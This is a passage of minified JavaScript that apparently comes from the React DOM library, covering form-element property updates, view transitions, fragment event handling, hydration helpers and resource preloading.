Error(o(91));break;default:Re(e,t,u,h,a,null)}ed(e,n,i,s);return;case"option":for(x in a)if(a.hasOwnProperty(x)&&(n=a[x],n!=null))switch(x){case"selected":e.selected=n&&typeof n!="function"&&typeof n!="symbol";break;default:Re(e,t,x,n,a,null)}return;case"dialog":de("beforetoggle",e),de("toggle",e),de("cancel",e),de("close",e);break;case"iframe":case"object":de("load",e);break;case"video":case"audio":for(n=0;n<Di.length;n++)de(Di[n],e);break;case"image":de("error",e),de("load",e);break;case"details":de("toggle",e);break;case"embed":case"source":case"link":de("error",e),de("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(N in a)if(a.hasOwnProperty(N)&&(n=a[N],n!=null))switch(N){case"children":case"dangerouslySetInnerHTML":throw Error(o(137,t));default:Re(e,t,N,n,a,null)}return;default:if(yc(t)){for(O in a)a.hasOwnProperty(O)&&(n=a[O],n!==void 0&&vu(e,t,O,n,a,void 0));return}}for(h in a)a.hasOwnProperty(h)&&(n=a[h],n!=null&&Re(e,t,h,n,a,null))}var eb={};function tb(e,t,a,n){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var i=null,s=null,u=null,h=null,x=null,N=null,O=null;for(z in a){var D=a[z];if(a.hasOwnProperty(z)&&D!=null)switch(z){case"checked":break;case"value":break;case"defaultValue":x=D;default:n.hasOwnProperty(z)||Re(e,t,z,null,n,D)}}for(var A in n){var z=n[A];if(D=a[A],n.hasOwnProperty(A)&&(z!=null||D!=null))switch(A){case"type":z!==D&&(Se=!0),s=z;break;case"name":z!==D&&(Se=!0),i=z;break;case"checked":z!==D&&(Se=!0),N=z;break;case"defaultChecked":z!==D&&(Se=!0),O=z;break;case"value":z!==D&&(Se=!0),u=z;break;case"defaultValue":z!==D&&(Se=!0),h=z;break;case"children":case"dangerouslySetInnerHTML":if(z!=null)throw Error(o(137,t));break;default:z!==D&&Re(e,t,A,z,n,D)}}gc(e,u,h,x,N,O,s,i);return;case"select":z=u=h=A=null;for(s in a)if(x=a[s],a.hasOwnProperty(s)&&x!=null)switch(s){case"value":break;case"multiple":z=x;default:n.hasOwnProperty(s)||Re(e,t,s,null,n,x)}for(i in n)if(s=n[i],x=a[i],n.hasOwnProperty(i)&&(s!=null||x!=null))switch(i){case"value":s!==x&&(Se=!0),A=s;break;case"defaultValue":s!==x&&(Se=!0),h=s;break;case"multiple":s!==x&&(Se=!0),u=s;default:s!==x&&Re(e,t,i,s,n,x)}t=h,a=u,n=z,A!=null?tl(e,!!a,A,!1):!!n!=!!a&&(t!=null?tl(e,!!a,t,!0):tl(e,!!a,a?[]:"",!1));return;case"textarea":z=A=null;for(h in a)if(i=a[h],a.hasOwnProperty(h)&&i!=null&&!n.hasOwnProperty(h))switch(h){case"value":break;case"children":break;default:Re(e,t,h,null,n,i)}for(u in n)if(i=n[u],s=a[u],n.hasOwnProperty(u)&&(i!=null||s!=null))switch(u){case"value":i!==s&&(Se=!0),A=i;break;case"defaultValue":i!==s&&(Se=!0),z=i;break;case"children":break;case"dangerouslySetInnerHTML":if(i!=null)throw Error(o(91));break;default:i!==s&&Re(e,t,u,i,n,s)}Wf(e,A,z);return;case"option":for(var L in a)if(A=a[L],a.hasOwnProperty(L)&&A!=null&&!n.hasOwnProperty(L))switch(L){case"selected":e.selected=!1;break;default:Re(e,t,L,null,n,A)}for(x in n)if(A=n[x],z=a[x],n.hasOwnProperty(x)&&A!==z&&(A!=null||z!=null))switch(x){case"selected":A!==z&&(Se=!0),e.selected=A&&typeof A!="function"&&typeof A!="symbol";break;default:Re(e,t,x,A,n,z)}return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var Z in a)A=a[Z],a.hasOwnProperty(Z)&&A!=null&&!n.hasOwnProperty(Z)&&Re(e,t,Z,null,n,A);for(N in n)if(A=n[N],z=a[N],n.hasOwnProperty(N)&&A!==z&&(A!=null||z!=null))switch(N){case"children":case"dangerouslySetInnerHTML":if(A!=null)throw Error(o(137,t));break;default:Re(e,t,N,A,n,z)}return;default:if(yc(t)){for(var oe in a)A=a[oe],a.hasOwnProperty(oe)&&A!==void 0&&!n.hasOwnProperty(oe)&&vu(e,t,oe,void 0,n,A);for(O in n)A=n[O],z=a[O],!n.hasOwnProperty(O)||A===z||A===void 0&&z===void 0||vu(e,t,O,A,n,z);return}}for(var j in a)A=a[j],a.hasOwnProperty(j)&&A!=null&&!n.hasOwnProperty(j)&&Re(e,t,j,null,n,A);for(D in n)A=n[D],z=a[D],!n.hasOwnProperty(D)||A===z||A==null&&z==null||Re(e,t,D,A,n,z)}function cp(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function ab(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,a=performance.getEntriesByType("resource"),n=0;n<a.length;n++){var i=a[n],s=i.transferSize,u=i.initiatorType,h=i.duration;if(s&&h&&cp(u)){for(u=0,h=i.responseEnd,n+=1;n<a.length;n++){var x=a[n],N=x.startTime;if(N>h)break;var O=x.transferSize,D=x.initiatorType;O&&cp(D)&&(x=x.responseEnd,u+=O*(x<h?1:(h-N)/(x-N)))}if(--n,t+=8*(s+u)/(i.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var yu=null,bu=null;function Mi(e){return e.nodeType===9?e:e.ownerDocument}function op(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function up(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function fp(e,t,a,n){return a=Mi(a).createElement(e),a[at]=n,a[gt]=t,st(a,e,t),Je(a),a}function _u(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var xu=null;function nb(){var e=window.event;return e&&e.type==="popstate"?e===xu?!1:(xu=e,!0):(xu=null,!1)}var Su=typeof setTimeout=="function"?setTimeout:void 0,lb=typeof clearTimeout=="function"?clearTimeout:void 0,dp=typeof Promise=="function"?Promise:void 0,hp=typeof requestAnimationFrame=="function"?requestAnimationFrame:Su,ib=typeof queueMicrotask=="function"?queueMicrotask:typeof dp<"u"?function(e){return dp.resolve(null).then(e).catch(rb)}:Su;function rb(e){setTimeout(function(){throw e})}function sn(e){return e==="head"}function pp(e,t){var a=t,n=0;do{var i=a.nextSibling;if(e.removeChild(a),i&&i.nodeType===8)if(a=i.data,a==="/$"||a==="/&"){if(n===0){e.removeChild(i),Ll(t);return}n--}else if(a==="$"||a==="$?"||a==="$~"||a==="$!"||a==="&")n++;else if(a==="html")zu(e.ownerDocument.documentElement);else if(a==="head"){a=e.ownerDocument.head,zu(a);for(var s=a.firstChild;s;){var u=s.nextSibling,h=s.nodeName;s[Wl]||h==="SCRIPT"||h==="STYLE"||h==="LINK"&&s.rel.toLowerCase()==="stylesheet"||a.removeChild(s),s=u}}else a==="body"&&zu(e.ownerDocument.body);a=i}while(a);Ll(t)}function mp(e,t){var a=e;e=0;do{var n=a.nextSibling;if(a.nodeType===1?t?(a._stashedDisplay=a.style.display,a.style.display="none"):(a.style.display=a._stashedDisplay||"",a.getAttribute("style")===""&&a.removeAttribute("style")):a.nodeType===3&&(t?(a._stashedText=a.nodeValue,a.nodeValue=""):a.nodeValue=a._stashedText||""),n&&n.nodeType===8)if(a=n.data,a==="/$"){if(e===0)break;e--}else a!=="$"&&a!=="$?"&&a!=="$~"&&a!=="$!"||e++;a=n}while(a)}function gp(e,t,a){if(t=CSS.escape(t)!==t?"r-"+btoa(t).replace(/=/g,""):t,e.style.viewTransitionName=t,a!=null&&(e.style.viewTransitionClass=a),a=getComputedStyle(e),a.display==="inline"){if(t=e.getClientRects(),t.length===1)var n=1;else for(var i=n=0;i<t.length;i++){var s=t[i];0<s.width&&0<s.height&&n++}n===1&&(e=e.style,e.display=t.length===1?"inline-block":"block",e.marginTop="-"+a.paddingTop,e.marginBottom="-"+a.paddingBottom)}}function vp(e,t){e=e.style,t=t.style;var a=t!=null?t.hasOwnProperty("viewTransitionName")?t.viewTransitionName:t.hasOwnProperty("view-transition-name")?t["view-transition-name"]:null:null;e.viewTransitionName=a==null||typeof a=="boolean"?"":(""+a).trim(),a=t!=null?t.hasOwnProperty("viewTransitionClass")?t.viewTransitionClass:t.hasOwnProperty("view-transition-class")?t["view-transition-class"]:null:null,e.viewTransitionClass=a==null||typeof a=="boolean"?"":(""+a).trim(),e.display==="inline-block"&&(t==null?e.display=e.margin="":(a=t.display,e.display=a==null||typeof a=="boolean"?"":a,a=t.margin,a!=null?e.margin=a:(a=t.hasOwnProperty("marginTop")?t.marginTop:t["margin-top"],e.marginTop=a==null||typeof a=="boolean"?"":a,t=t.hasOwnProperty("marginBottom")?t.marginBottom:t["margin-bottom"],e.marginBottom=t==null||typeof t=="boolean"?"":t)))}function sb(e,t,a){return a=a.ownerDocument.defaultView,{rect:e,abs:t.position==="absolute"||t.position==="fixed",clip:t.clipPath!=="none"||t.overflow!=="visible"||t.filter!=="none"||t.mask!=="none"||t.mask!=="none"||t.borderRadius!=="0px",view:0<=e.bottom&&0<=e.right&&e.top<=a.innerHeight&&e.left<=a.innerWidth}}function Tu(e){var t=e.getBoundingClientRect(),a=getComputedStyle(e);return sb(t,a,e)}function cb(e){return e.documentElement.clientHeight}function ob(e){this.addEventListener("load",e),this.addEventListener("error",e)}function ub(e,t,a,n,i,s,u,h,x){var N=t.nodeType===9?t:t.ownerDocument;try{var O=N.startViewTransition({update:function(){var A=N.defaultView,z=A.navigation&&A.navigation.transition,L=N.fonts.status;n();var Z=[];if(L==="loaded"&&(cb(N),N.fonts.status==="loading"&&Z.push(N.fonts.ready)),L=Z.length,e!==null)for(var oe=e.suspenseyImages,j=0,S=0;S<oe.length;S++){var C=oe[S];if(!C.complete){var R=C.getBoundingClientRect();if(0<R.bottom&&0<R.right&&R.top<A.innerHeight&&R.left<A.innerWidth){if(j+=kp(C),j>Os){Z.length=L;break}C=new Promise(ob.bind(C)),Z.push(C)}}}if(0<Z.length)return A=Promise.race([Promise.all(Z),new Promise(function(Y){return setTimeout(Y,500)})]).then(i,i),(z?Promise.allSettled([z.finished,A]):A).then(s,s);if(i(),z)return z.finished.then(s,s);s()},types:a});N.__reactViewTransition=O;var D=[];return O.ready.then(function(){for(var A=N.documentElement.getAnimations({subtree:!0}),z=0;z<A.length;z++){var L=A[z],Z=L.effect,oe=Z.pseudoElement;if(oe!=null&&oe.startsWith("::view-transition")){D.push(L),L=Z.getKeyframes();for(var j=oe=void 0,S=!0,C=0;C<L.length;C++){var R=L[C],Y=R.width;if(oe===void 0)oe=Y;else if(oe!==Y){S=!1;break}if(Y=R.height,j===void 0)j=Y;else if(j!==Y){S=!1;break}delete R.width,delete R.height,R.transform==="none"&&delete R.transform}S&&oe!==void 0&&j!==void 0&&(Z.setKeyframes(L),S=getComputedStyle(Z.target,Z.pseudoElement),S.width!==oe||S.height!==j)&&(S=L[0],S.width=oe,S.height=j,S=L[L.length-1],S.width=oe,S.height=j,Z.setKeyframes(L))}}u()},function(A){N.__reactViewTransition===O&&(N.__reactViewTransition=null);try{if(typeof A=="object"&&A!==null)switch(A.name){case"InvalidStateError":(A.message==="View transition was skipped because document visibility state is hidden."||A.message==="Skipping view transition because document visibility state has become hidden."||A.message==="Skipping view transition because viewport size changed."||A.message==="Transition was aborted because of invalid state")&&(A=null)}A!==null&&x(A)}finally{n(),i(),u()}}),O.finished.finally(function(){for(var A=0;A<D.length;A++)D[A].cancel();N.__reactViewTransition===O&&(N.__reactViewTransition=null),h()}),O}catch{return n(),i(),u(),null}}function Gn(e,t){this._scope=document.documentElement,this._selector="::view-transition-"+e+"("+t+")"}Gn.prototype.animate=function(e,t){return t=typeof t=="number"?{duration:t}:B({},t),t.pseudoElement=this._selector,this._scope.animate(e,t)},Gn.prototype.getAnimations=function(){for(var e=this._scope,t=this._selector,a=e.getAnimations({subtree:!0}),n=[],i=0;i<a.length;i++){var s=a[i].effect;s!==null&&s.target===e&&s.pseudoElement===t&&n.push(a[i])}return n},Gn.prototype.getComputedStyle=function(){return getComputedStyle(this._scope,this._selector)};function yp(e){return{name:e,group:new Gn("group",e),imagePair:new Gn("image-pair",e),old:new Gn("old",e),new:new Gn("new",e)}}function Dt(e){this._fragmentFiber=e,this._observers=this._eventListeners=null}Dt.prototype.addEventListener=function(e,t,a){var n=null,i=null;if(!(a!=null&&typeof a!="boolean"&&(n=a.signal||null,n!==null&&n.aborted))){this._eventListeners===null&&(this._eventListeners=[]);var s=this._eventListeners;if(_p(s,e,t,a)===-1){var u=this,h=t;a!=null&&typeof a!="boolean"&&a.once===!0&&(h=function(x){u.removeEventListener(e,t,a),typeof t=="function"?t.call(this,x):t.handleEvent(x)}),n!==null&&(i=u.removeEventListener.bind(u,e,t,a),n.addEventListener("abort",i,{once:!0}),i=n.removeEventListener.bind(n,"abort",i)),n=Dl(a),s.push({type:e,listener:t,optionsOrUseCapture:a,attachedListener:h,cleanup:i}),b(this._fragmentFiber.child,!1,fb,e,h,n)}this._eventListeners=s}};function fb(e,t,a,n){return q(e).addEventListener(t,a,n),!1}Dt.prototype.removeEventListener=function(e,t,a){var n=this._eventListeners;if(n!==null&&(t=_p(n,e,t,a),t!==-1)){var i=n[t];a=i.attachedListener;var s=i.cleanup;i=Dl(i.optionsOrUseCapture),b(this._fragmentFiber.child,!1,db,e,a,i),n.splice(t,1),s!==null&&s()}};function db(e,t,a,n){return q(e).removeEventListener(t,a,n),!1}function Dl(e){return e!=null&&typeof e!="boolean"&&(e.once===!0||e.signal instanceof AbortSignal)?{capture:e.capture,passive:e.passive}:e}function bp(e){return e==null?"c=0":typeof e=="boolean"?"c="+(e?"1":"0"):"c="+(e.capture?"1":"0")}function _p(e,t,a,n){if(e.length===0)return-1;n=bp(n);for(var i=0;i<e.length;i++){var s=e[i];if(s.type===t&&s.listener===a&&bp(s.optionsOrUseCapture)===n)return i}return-1}Dt.prototype.dispatchEvent=function(e){var t=w(this._fragmentFiber);if(t===null)return!0;t=q(t);var a=this._eventListeners;if(a!==null&&0<a.length||!e.bubbles){var n=t.nodeType===9?t.createComment(""):document.createTextNode("");if(a)for(var i=0;i<a.length;i++){var s=a[i];n.addEventListener(s.type,s.attachedListener,Dl(s.optionsOrUseCapture))}if(t.appendChild(n),e=n.dispatchEvent(e),a)for(i=0;i<a.length;i++)s=a[i],n.removeEventListener(s.type,s.attachedListener,Dl(s.optionsOrUseCapture));return t.removeChild(n),e}return t.dispatchEvent(e)},Dt.prototype.focus=function(e){b(this._fragmentFiber.child,!0,xp,e,void 0,void 0)};function xp(e,t){return e.tag===6?!1:(e=q(e),wb(e,t))}Dt.prototype.focusLast=function(e){var t=[];b(this._fragmentFiber.child,!0,wu,t,void 0,void 0);for(var a=t.length-1;0<=a&&!xp(t[a],e);a--);};function wu(e,t){return t.push(e),!1}Dt.prototype.blur=function(){var e=w(this._fragmentFiber);e!==null&&(e=q(e),e=Mi(e).activeElement,e!==null&&b(this._fragmentFiber.child,!1,hb,e,void 0,void 0))};function hb(e,t){return e.tag===6?!1:(e=q(e),e===t||e.contains(t)?(t.blur(),!0):!1)}Dt.prototype.observeUsing=function(e){this._observers===null&&(this._observers=new Set),this._observers.add(e),b(this._fragmentFiber.child,!1,pb,e,void 0,void 0)};function pb(e,t){return e.tag===6||(e=q(e),t.observe(e)),!1}Dt.prototype.unobserveUsing=function(e){var t=this._observers;if(t!==null&&t.has(e)){t.delete(e),b(this._fragmentFiber.child,!1,mb,e,void 0,void 0);for(var a=t=0;a<Wt.length;a++){var n=Wt[a];n.fragmentInstance===this&&n.observer===e?e.unobserve(n.instance):Wt[t++]=n}Wt.length=t}};function mb(e,t){return e.tag===6||(e=q(e),t.unobserve(e)),!1}var Wt=[],Eu=!1;function gb(e,t,a){Wt.push({fragmentInstance:e,observer:t,instance:a}),Eu||(Eu=!0,Eb(function(){Eu=!1;var n=Wt;Wt=[];for(var i=0;i<n.length;i++){var s=n[i];s.observer.unobserve(s.instance)}}))}Dt.prototype.getClientRects=function(){var e=[];return b(this._fragmentFiber.child,!1,vb,e,void 0,void 0),e};function vb(e,t){if(e.tag===6){e=e.stateNode;var a=e.ownerDocument.createRange();a.selectNodeContents(e),t.push.apply(t,a.getClientRects())}else e=q(e),t.push.apply(t,e.getClientRects());return!1}Dt.prototype.getRootNode=function(e){var t=w(this._fragmentFiber);return t===null?this:q(t).getRootNode(e)},Dt.prototype.compareDocumentPosition=function(e){var t=w(this._fragmentFiber);if(t===null)return Node.DOCUMENT_POSITION_DISCONNECTED;var a=[];b(this._fragmentFiber.child,!1,wu,a,void 0,void 0);var n=q(t);if(a.length===0){if(a=n,T(this._fragmentFiber)){e:{for(t=this._fragmentFiber.return;t!==null;){if(t.tag===4){t=t.stateNode.containerInfo;break e}if(t.tag===3||t.tag===5||t.tag===27)break;t=t.return}t=null}t!=null&&(a=t)}t=this._fragmentFiber;var i=n=a.compareDocumentPosition(e);return a===e?i=Node.DOCUMENT_POSITION_CONTAINS:n&Node.DOCUMENT_POSITION_CONTAINED_BY&&(a=U(t)[1],a===null?i=Node.DOCUMENT_POSITION_PRECEDING:(e=q(a).compareDocumentPosition(e),i=e===0||e&Node.DOCUMENT_POSITION_FOLLOWING?Node.DOCUMENT_POSITION_FOLLOWING:Node.DOCUMENT_POSITION_PRECEDING)),i|=Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC}t=q(a[0]),i=q(a[a.length-1]);var s=T(this._fragmentFiber)?t.parentElement:n;if(s==null)return Node.DOCUMENT_POSITION_DISCONNECTED;n=s.compareDocumentPosition(t)&Node.DOCUMENT_POSITION_CONTAINED_BY,s=s.compareDocumentPosition(i)&Node.DOCUMENT_POSITION_CONTAINED_BY;var u=t.compareDocumentPosition(e),h=i.compareDocumentPosition(e),x=u&Node.DOCUMENT_POSITION_CONTAINED_BY||h&Node.DOCUMENT_POSITION_CONTAINED_BY;return h=n&&s&&u&Node.DOCUMENT_POSITION_FOLLOWING&&h&Node.DOCUMENT_POSITION_PRECEDING,t=n&&t===e||s&&i===e||x||h?Node.DOCUMENT_POSITION_CONTAINED_BY:!n&&t===e||!s&&i===e?Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC:u,t&Node.DOCUMENT_POSITION_DISCONNECTED||t&Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC||yb(t,this._fragmentFiber,a[0],a[a.length-1],e)?t:Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC};function yb(e,t,a,n,i){var s=bn(i);if(e&Node.DOCUMENT_POSITION_CONTAINED_BY){if(a=!!s)e:{for(;s!==null;){if(s.tag===7&&(s===t||s.alternate===t)){a=!0;break e}s=s.return}a=!1}return a}if(e&Node.DOCUMENT_POSITION_CONTAINS){if(s===null)return s=i.ownerDocument,i===s||i===s.documentElement||i===s.body;e:{for(s=t,t=w(t);s!==null;){if(!(s.tag!==5&&s.tag!==3&&s.tag!==27||s!==t&&s.alternate!==t)){s=!0;break e}s=s.return}s=!1}return s}return e&Node.DOCUMENT_POSITION_PRECEDING?((t=!!s)&&!(t=s===a)&&(t=he(a,s,Q),t===null?t=!1:(b(t,!0,W,s,a),s=V,V=null,t=s!==null)),t):e&Node.DOCUMENT_POSITION_FOLLOWING?((t=!!s)&&!(t=s===n)&&(t=he(n,s,Q),t===null?t=!1:(b(t,!0,M,s,n),s=V,ee=V=null,t=s!==null)),t):!1}function Sp(e,t){var a=e.ownerDocument.createRange();a.selectNodeContents(e),e=a.getBoundingClientRect(),window.scrollTo(window.scrollX+e.left,t?window.scrollY+e.top:window.scrollY+e.bottom-window.innerHeight)}Dt.prototype.scrollIntoView=function(e){if(typeof e=="object")throw Error(o(566));var t=[];b(this._fragmentFiber.child,!1,wu,t,void 0,void 0);var a=e!==!1;if(t.length===0){var n=U(this._fragmentFiber);if(n=a?n[1]||n[0]||w(this._fragmentFiber):n[0]||n[1],n===null)return;if(n.tag===6){e=q(n),Sp(e,a);return}if(n=q(n),n.nodeType!==9){if(n.nodeType===11){a="host"in n?n.host:null,a!==null&&a.scrollIntoView(e);return}n.scrollIntoView(e)}}for(n=a?t.length-1:0;n!==(a?-1:t.length);){var i=t[n];i.tag===6?(i=q(i),Sp(i,a)):q(i).scrollIntoView(e),n+=a?-1:1}};function bb(e,t){return e=q(e),Tp(e,t),!1}function Tp(e,t){e.reactFragments==null&&(e.reactFragments=new Set),e.reactFragments.add(t)}function wp(e,t){var a=t._eventListeners;if(a!==null)for(var n=0;n<a.length;n++){var i=a[n];e.addEventListener(i.type,i.attachedListener,Dl(i.optionsOrUseCapture))}e.nodeType!==3&&(a=t._observers,a!==null&&a.forEach(function(s){for(var u=0,h=0;h<Wt.length;h++){var x=Wt[h];(x.fragmentInstance!==t||x.observer!==s||x.instance!==e)&&(Wt[u++]=x)}Wt.length=u,s.observe(e)}),Tp(e,t))}function _b(e,t){var a=t._eventListeners;if(a!==null)for(var n=0;n<a.length;n++){var i=a[n];e.removeEventListener(i.type,i.attachedListener,Dl(i.optionsOrUseCapture))}e.nodeType!==3&&(a=t._observers,a!==null&&a.forEach(function(s){typeof s.rootMargin=="string"?gb(t,s,e):s.unobserve(e)}),e.reactFragments!=null&&e.reactFragments.delete(t))}function Au(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var a=t;switch(t=t.nextSibling,a.nodeName){case"HTML":case"HEAD":case"BODY":Au(a),br(a);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(a.rel.toLowerCase()==="stylesheet")continue}e.removeChild(a)}}function xb(e,t,a,n){for(;e.nodeType===1;){var i=a;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!n&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(n){if(!e[Wl])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(s=e.getAttribute("rel"),s==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(s!==i.rel||e.getAttribute("href")!==(i.href==null||i.href===""?null:i.href)||e.getAttribute("crossorigin")!==(i.crossOrigin==null?null:i.crossOrigin)||e.getAttribute("title")!==(i.title==null?null:i.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(s=e.getAttribute("src"),(s!==(i.src==null?null:i.src)||e.getAttribute("type")!==(i.type==null?null:i.type)||e.getAttribute("crossorigin")!==(i.crossOrigin==null?null:i.crossOrigin))&&s&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var s=i.name==null?null:""+i.name;if(i.type==="hidden"&&e.getAttribute("name")===s)return e}else return e;if(e=Zt(e.nextSibling),e===null)break}return null}function Sb(e,t,a){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!a||(e=Zt(e.nextSibling),e===null))return null;return e}function Ep(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=Zt(e.nextSibling),e===null))return null;return e}function ju(e){return e.data==="$?"||e.data==="$~"}function Nu(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function Tb(e,t){var a=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||a.readyState!=="loading")t();else{var n=function(){t(),a.removeEventListener("DOMContentLoaded",n)};a.addEventListener("DOMContentLoaded",n),e._reactRetry=n}}function Zt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var Cu=null;function Ap(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="/$"||a==="/&"){if(t===0)return Zt(e.nextSibling);t--}else a!=="$"&&a!=="$!"&&a!=="$?"&&a!=="$~"&&a!=="&"||t++}e=e.nextSibling}return null}function jp(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="$"||a==="$!"||a==="$?"||a==="$~"||a==="&"){if(t===0)return e;t--}else a!=="/$"&&a!=="/&"||t++}e=e.previousSibling}return null}function wb(e,t){function a(){n=!0}if(e.ownerDocument.activeElement===e)return!0;var n=!1;try{e.ownerDocument.addEventListener("focus",a,!0),(e.focus||HTMLElement.prototype.focus).call(e,t)}finally{e.ownerDocument.removeEventListener("focus",a,!0)}return n}function Eb(e){hp(function(){hp(function(t){return e(t)})})}function Np(e,t,a){switch(t=Mi(a),e){case"html":if(e=t.documentElement,!e)throw Error(o(452));return e;case"head":if(e=t.head,!e)throw Error(o(453));return e;case"body":if(e=t.body,!e)throw Error(o(454));return e;default:throw Error(o(451))}}function Cp(e,t,a){for(var n in a){var i=a[n];a.hasOwnProperty(n)&&i!=null&&Re(e,t,n,null,eb,i)}a.dangerouslySetInnerHTML!=null&&(e.textContent=""),e.onclick===aa&&(e.onclick=null),br(e)}function zu(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);br(e)}var Xt=new Map,zp=new Set;function Hi(e){if(typeof e.getRootNode=="function"){var t=e.getRootNode();if(t.nodeType===9||t.nodeType===11)return t}return e.nodeType===9?e:e.ownerDocument}var Ua=re.d;re.d={f:Ab,r:jb,D:Nb,C:Cb,L:zb,m:Ob,X:Db,S:Rb,M:Ub};function Ab(){var e=Ua.f(),t=Ss();return e||t}function jb(e){var t=$n(e);t!==null&&t.tag===5&&t.type==="form"?Rh(t):Ua.r(e)}var Ul=typeof document>"u"?null:document;function Op(e,t,a){var n=Ul;if(n&&typeof t=="string"&&t){var i=Ht(t);i='link[rel="'+e+'"][href="'+i+'"]',typeof a=="string"&&(i+='[crossorigin="'+a+'"]'),zp.has(i)||(zp.add(i),e={rel:e,crossOrigin:a,href:t},n.querySelector(i)===null&&(t=n.createElement("link"),st(t,"link",e),Je(t),n.head.appendChild(t)))}}function Nb(e){Ua.D(e),Op("dns-prefetch",e,null)}function Cb(e,t){Ua.C(e,t),Op("preconnect",e,t)}function zb(e,t,a){Ua.L(e,t,a);var n=Ul;if(n&&e&&t){var i='link[rel="preload"][as="'+Ht(t)+'"]';t==="image"&&a&&a.imageSrcSet?(i+='[imagesrcset="'+Ht(a.imageSrcSet)+'"]',typeof a.imageSizes=="string"&&(i+='[imagesizes="'+Ht(a.imageSizes)+'"]')):i+='[href="'+Ht(e)+'"]';var s=i;switch(t){case"style":s=Ml(e);break;case"script":s=Hl(e)}if(!(Xt.has(s)||(e=B({rel:"preload",href:t==="image"&&a&&a.imageSrcSet?void 0:e,as:t},a),Xt.set(s,e),n.querySelector(i)!==null||t==="style"&&n.querySelector(Bi(s))||t==="script"&&n.querySelector(ki(s))))){var u=n.createElement("link");st(u,"link",e),t==="style"&&(u[yr]=!0,u.onload=u.onerror=function(){Xf(u)}),Je(u),n.head.appendChild(u)}}}function Ob(e,t){Ua.m(e,t);var a=Ul;if(a&&e){var n=t&&typeof t.as=="string"?t.as:"script",i='link[rel="modulepreload"][as="'+Ht(n)+'"][href="'+Ht(e)+'"]',s=i;switch(n){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":s=Hl(e)}if(!Xt.has(s)&&(e=B({rel:"modulepreload",href:e},t),Xt.set(s,e),a.querySelector(i)===null)){switch(n){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(a.querySelector(ki(s)))return}n=a.createElement("link"),st(n,"link",e),Je(n),a.head.appendChild(n)}}}function Rb(e,t,a){Ua.S(e,t,a);var n=Ul;if(n&&e){var i=Wn(n).hoistableStyles,s=Ml(e);t=t||"default";var u=i.get(s);if(!u){var h={loading:0,preload:null};if(u=n.querySelector(Bi(s)))h.loading=5;else{e=B({rel:"stylesheet",href:e,"data-precedence":t},a),(a=Xt.get(s))&&Ou(e,a);var x=u=n.createElement("link");Je(x),st(x,"link",e),x._p=new Promise(function(N,O){x.onload=N,x.onerror=O}),x.addEventListener("load",function(){h.loading|=1}),x.addEventListener("error",function(){h.loading|=2}),h.loading|=4,Cs(u,t,n)}u={type:"stylesheet",instance:u,count:1,state:h},i.set(s,u)}}}function Db(e,t){Ua.X(e,t);var a=Ul;if(a&&e){var n=Wn(a).hoistableScripts,i=Hl(e),s=n.get(i);s||(s=a.querySelector(ki(i)),s||(e=B({src:e,async:!0},t),(t=Xt.get(i))&&Ru(e,t),s=a.createElement("script"),Je(s),st(s,"link",e),a.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},n.set(i,s))}}function Ub(e,t){Ua.M(e,t);var a=Ul;if(a&&e){var n=Wn(a).hoistableScripts,i=Hl(e),s=n.get(i);s||(s=a.querySelector(ki(i)),s||(e=B({src:e,async:!0,type:"module"},t),(t=Xt.get(i))&&Ru(e,t),s=a.createElement("script"),Je(s),st(s,"link",e),a.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},n.set(i,s))}}function Rp(e,t,a,n){var i=(i=Ba.current)?Hi(i):null;if(!i)throw Error(o(446));switch(e){case"meta":case"title":return null;case"style":return typeof a.precedence=="string"&&typeof 